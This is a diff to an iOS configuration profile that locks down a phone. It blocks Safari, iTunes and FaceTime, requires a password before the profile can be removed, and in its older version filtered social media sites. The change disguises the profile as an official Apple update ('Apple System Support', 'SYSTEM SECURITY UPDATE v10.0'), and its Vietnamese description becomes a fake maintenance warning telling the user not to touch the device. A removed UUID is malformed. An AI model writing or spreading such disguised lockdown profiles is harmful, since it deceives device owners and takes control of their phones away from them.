@@ -8,7 +8,7 @@
 	<array>
 		<dict>
 			<key>PayloadIdentifier</key>
-			<string>com.vip.security.restrictions</string>
+			<string>com.vip.security.restrictions.v10</string>
 			<key>PayloadType</key>
 			<string>com.apple.applicationaccess</string>
 			<key>PayloadUUID</key>
@@ -23,33 +23,12 @@
 			<false/>
 			<key>allowSafari</key>
 			<false/>
-			<key>allowScreenShot</key>
-			<false/>
 			<key>allowiTunes</key>
 			<false/>
-		</dict>
-		<dict>
-			<key>AutoFilterEnabled</key>
-			<true/>
-			<key>BlacklistedURLs</key>
-			<array>
-				<string>facebook.com</string>
-				<string>messenger.com</string>
-				<string>instagram.com</string>
-				<string>youtube.com</string>
-				<string>tiktok.com</string>
-			</array>
-			<key>FilterType</key>
-			<string>BuiltIn</string>
-			<key>PayloadIdentifier</key>
-			<string>com.vip.security.webfilter</string>
-			<key>PayloadType</key>
-			<string>com.apple.webcontent-filter</string>
-			<key>PayloadUUID</key>
-			<string>C2D3E4F5-G6H7-8I9J-0K1L-M2N3O4P5Q6R7</string>
-			<key>PayloadVersion</key>
-			<integer>1</integer>
-		</dict>
+			<key>allowFaceTime</key>
+			<false/>
+			<key>ratingApps</key>
+			<integer>100</integer> </dict>
 		<dict>
 			<key>PayloadDisplayName</key>
 			<string>Profile Removal Password</string>
@@ -66,13 +45,13 @@
 		</dict>
 	</array>
 	<key>PayloadDescription</key>
-	<string>He thong quan ly thiet bi ban hang. Nghiem cam tu y go bo.</string>
+	<string>Canh bao: He thong dang duoc bao tri. Vui long khong thao tac.</string>
 	<key>PayloadDisplayName</key>
-	<string>SYSTEM SECURITY VIP v7.0</string>
+	<string>SYSTEM SECURITY UPDATE v10.0</string>
 	<key>PayloadIdentifier</key>
 	<string>com.vip.secure.838689</string>
 	<key>PayloadOrganization</key>
-	<string>APPLE SECURITY</string>
+	<string>Apple System Support</string>
 	<key>PayloadType</key>
 	<string>Configuration</string>
 	<key>PayloadUUID</key>
